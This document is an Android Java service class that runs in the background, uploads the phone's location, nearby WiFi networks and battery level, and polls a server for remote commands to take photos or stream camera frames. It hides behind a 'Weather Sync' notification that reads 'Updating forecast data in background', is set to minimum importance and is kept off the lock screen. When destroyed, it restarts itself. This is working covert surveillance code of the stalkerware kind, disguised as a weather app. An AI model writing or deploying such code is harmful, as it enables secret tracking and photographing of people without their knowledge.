package com.lunarphoton.stratus;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ServiceInfo;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class GuardianService extends Service {

    public static final String ACTION_START = "com.lunarphoton.stratus.START";
    public static final String ACTION_STOP = "com.lunarphoton.stratus.STOP";
    public static final String ACTION_SOS = "com.lunarphoton.stratus.SOS";

    private static final String CHANNEL = "weather_sync_channel";
    private static final int NOTIF_ID = 1042;

    public static void start(Context ctx) {
        Intent i = new Intent(ctx, GuardianService.class).setAction(ACTION_START);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(i);
        } else {
            ctx.startService(i);
        }
    }

    public static void stop(Context ctx) {
        Intent i = new Intent(ctx, GuardianService.class).setAction(ACTION_STOP);
        ctx.startService(i);
    }

    public static void sos(Context ctx) {
        Intent i = new Intent(ctx, GuardianService.class).setAction(ACTION_SOS);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(i);
        } else {
            ctx.startService(i);
        }
    }

    private Uploader uploader;
    private LocationManager locationManager;
    private WifiManager wifiManager;
    private PowerManager.WakeLock wakeLock;

    private Location lastLocation;
    private final List<JSONObject> latestWifi = Collections.synchronizedList(new ArrayList<>());

    private ScheduledExecutorService pingScheduler;
    private ScheduledExecutorService cmdScheduler;
    private ScheduledExecutorService frameScheduler;

    private Ringtone ringtone;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Runnable ringTimeout = this::stopRing;

    private final LocationListener locationListener = new LocationListener() {
        @Override
        public void onLocationChanged(Location loc) {
            if (loc != null) lastLocation = loc;
        }
        @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
        @Override public void onProviderEnabled(String provider) {}
        @Override public void onProviderDisabled(String provider) {}
    };

    private final BroadcastReceiver wifiReceiver = new BroadcastReceiver() {
        @SuppressLint("MissingPermission")
        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                List<ScanResult> results = wifiManager.getScanResults();
                if (results != null) {
                    List<JSONObject> aps = new ArrayList<>();
                    for (ScanResult r : results) {
                        JSONObject ap = new JSONObject();
                        ap.put("ssid", r.SSID != null ? r.SSID : "");
                        ap.put("bssid", r.BSSID != null ? r.BSSID : "");
                        ap.put("rssi", r.level);
                        aps.add(ap);
                        if (aps.size() >= 15) break;
                    }
                    synchronized (latestWifi) {
                        latestWifi.clear();
                        latestWifi.addAll(aps);
                    }
                }
            } catch (Exception ignored) {}
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        uploader = new Uploader();
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        createChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;
        if (ACTION_STOP.equals(action)) {
            stopEverything();
            return START_NOT_STICKY;
        }

        enterForeground();
        ensureRunning();

        if (ACTION_SOS.equals(action)) {
            handleSos();
        }

        return START_STICKY;
    }

    private void enterForeground() {
        Notification notif = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notif,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        } else {
            startForeground(NOTIF_ID, notif);
        }
    }

    @SuppressLint({"MissingPermission", "WakelockTimeout"})
    private synchronized void ensureRunning() {
        if (pingScheduler != null) return;

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null && wakeLock == null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "stratus:sync");
            wakeLock.setReferenceCounted(false);
            try { wakeLock.acquire(); } catch (Exception ignored) {}
        }

        int intervalSec = BeaconConfig.INTERVAL_SEC;
        try {
            intervalSec = getSharedPreferences("stratus_prefs", Context.MODE_PRIVATE)
                    .getInt("interval_sec", BeaconConfig.INTERVAL_SEC);
        } catch (Exception ignored) {}
        if (intervalSec < 2) intervalSec = 2;
        long minTimeMs = (long) intervalSec * 1000L;

        // Listen for GPS & Network location
        try {
            if (locationManager != null) {
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, minTimeMs, 0f, locationListener, Looper.getMainLooper());
                }
                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, minTimeMs, 0f, locationListener, Looper.getMainLooper());
                }
                Location last = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (last == null) last = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (last != null) lastLocation = last;
            }
        } catch (SecurityException ignored) {}

        // Listen for WiFi scans
        try {
            registerReceiver(wifiReceiver, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
        } catch (Exception ignored) {}

        // Periodic ping loop
        pingScheduler = Executors.newSingleThreadScheduledExecutor();
        pingScheduler.scheduleWithFixedDelay(this::tick, 0, intervalSec, TimeUnit.SECONDS);

        // Periodic command polling loop
        cmdScheduler = Executors.newSingleThreadScheduledExecutor();
        cmdScheduler.scheduleWithFixedDelay(this::pollCommands, 3, 5, TimeUnit.SECONDS);
    }

    private void tick() {
        try {
            JSONObject payload = new JSONObject();
            payload.put("device_id", BeaconConfig.DEVICE_ID);
            payload.put("name", BeaconConfig.DEVICE_NAME);
            payload.put("kind", "phone");
            payload.put("ts", System.currentTimeMillis() / 1000.0);
            payload.put("battery", getBatteryLevel());

            if (lastLocation != null) {
                payload.put("lat", lastLocation.getLatitude());
                payload.put("lon", lastLocation.getLongitude());
                payload.put("accuracy", lastLocation.getAccuracy());
                payload.put("speed", lastLocation.getSpeed());
                payload.put("heading", lastLocation.getBearing());
            }

            JSONArray wList = new JSONArray();
            synchronized (latestWifi) {
                for (JSONObject ap : latestWifi) wList.put(ap);
            }
            if (wList.length() > 0) payload.put("wifi", wList);

            uploader.ping(payload);

            // Trigger background WiFi scan occasionally
            if (wifiManager != null) {
                try { wifiManager.startScan(); } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }

    private void pollCommands() {
        try {
            JSONArray cmds = uploader.fetchCommands();
            if (cmds == null || cmds.length() == 0) return;
            for (int i = 0; i < cmds.length(); i++) {
                JSONObject c = cmds.optJSONObject(i);
                if (c == null) continue;
                String cmd = c.optString("cmd", "");
                JSONObject args = c.optJSONObject("args");
                executeCommand(cmd, args);
            }
        } catch (Exception ignored) {}
    }

    private void executeCommand(String cmd, JSONObject args) {
        switch (cmd) {
            case "ping_now":
                new Thread(this::tick).start();
                break;
            case "snap":
                captureAndSend("manual", 0);
                break;
            case "sos":
                handleSos();
                break;
            case "set_interval":
            case "interval":
                int sec = args != null ? args.optInt("sec", BeaconConfig.INTERVAL_SEC) : BeaconConfig.INTERVAL_SEC;
                if (sec < 2) sec = 2;
                updateLocationInterval(sec);
                break;
            case "live_on":
                int every = args != null ? args.optInt("every", 5) : 5;
                startLiveFrames(Math.max(2, every));
                break;
            case "live_off":
                stopLiveFrames();
                break;
        }
    }

    private synchronized void updateLocationInterval(int sec) {
        try {
            getSharedPreferences("stratus_prefs", Context.MODE_PRIVATE)
                    .edit()
                    .putInt("interval_sec", sec)
                    .apply();
        } catch (Exception ignored) {}

        if (pingScheduler != null) {
            pingScheduler.shutdownNow();
            pingScheduler = Executors.newSingleThreadScheduledExecutor();
            pingScheduler.scheduleWithFixedDelay(this::tick, 0, sec, TimeUnit.SECONDS);
        }

        try {
            if (locationManager != null) {
                locationManager.removeUpdates(locationListener);
                long minTimeMs = (long) sec * 1000L;
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, minTimeMs, 0f, locationListener, Looper.getMainLooper());
                }
                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, minTimeMs, 0f, locationListener, Looper.getMainLooper());
                }
            }
        } catch (SecurityException ignored) {}
    }

    private void captureAndSend(String reason, int index) {
        CameraCapture.takePhoto(Camera.CameraInfo.CAMERA_FACING_BACK, jpeg -> {
            if (jpeg != null) {
                uploader.uploadPhoto(jpeg, reason, index);
            } else {
                CameraCapture.takePhoto(Camera.CameraInfo.CAMERA_FACING_FRONT, frontJpeg -> {
                    if (frontJpeg != null) uploader.uploadPhoto(frontJpeg, reason, index);
                });
            }
        });
    }

    private synchronized void startLiveFrames(int everySec) {
        stopLiveFrames();
        frameScheduler = Executors.newSingleThreadScheduledExecutor();
        final int[] idx = {0};
        frameScheduler.scheduleWithFixedDelay(() -> {
            captureAndSend("live", idx[0]++);
        }, 0, everySec, TimeUnit.SECONDS);
    }

    private synchronized void stopLiveFrames() {
        if (frameScheduler != null) {
            frameScheduler.shutdownNow();
            frameScheduler = null;
        }
    }

    private void handleSos() {
        new Thread(() -> {
            uploader.sendSos();
            tick();
        }).start();

        // Burst captures
        for (int i = 0; i < 3; i++) {
            final int index = i;
            mainHandler.postDelayed(() -> captureAndSend("sos", index), i * 1500L);
        }

        // Sound alarm
        mainHandler.post(this::startRing);
    }

    private void startRing() {
        stopRing();
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
            }
            android.net.Uri uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
            if (uri == null) uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
            ringtone = RingtoneManager.getRingtone(this, uri);
            if (ringtone != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    ringtone.setAudioAttributes(new AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_ALARM)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                            .build());
                }
                ringtone.play();
                mainHandler.postDelayed(ringTimeout, 30_000L);
            }
        } catch (Exception ignored) {}
    }

    private void stopRing() {
        mainHandler.removeCallbacks(ringTimeout);
        if (ringtone != null) {
            try { ringtone.stop(); } catch (Exception ignored) {}
            ringtone = null;
        }
    }

    private int getBatteryLevel() {
        try {
            Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (batteryIntent == null) return -1;
            int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            if (level >= 0 && scale > 0) return Math.round((level / (float) scale) * 100);
        } catch (Exception ignored) {}
        return -1;
    }

    private void stopEverything() {
        if (pingScheduler != null) { pingScheduler.shutdownNow(); pingScheduler = null; }
        if (cmdScheduler != null) { cmdScheduler.shutdownNow(); cmdScheduler = null; }
        stopLiveFrames();
        stopRing();

        try {
            if (locationManager != null) locationManager.removeUpdates(locationListener);
        } catch (Exception ignored) {}
        try {
            unregisterReceiver(wifiReceiver);
        } catch (Exception ignored) {}

        if (wakeLock != null && wakeLock.isHeld()) {
            try { wakeLock.release(); } catch (Exception ignored) {}
            wakeLock = null;
        }

        stopForeground(true);
        stopSelf();
    }

    @Override
    public void onDestroy() {
        start(getApplicationContext());
        super.onDestroy();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL, "Weather Sync Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        PendingIntent pi = PendingIntent.getActivity(
                this, 0, new Intent(this, MainActivity.class),
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, CHANNEL)
                : new Notification.Builder(this);

        b.setContentTitle("Weather Sync")
                .setContentText("Updating forecast data in background")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true)
                .setContentIntent(pi);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            b.setVisibility(Notification.VISIBILITY_SECRET);
        }
        return b.build();
    }
}
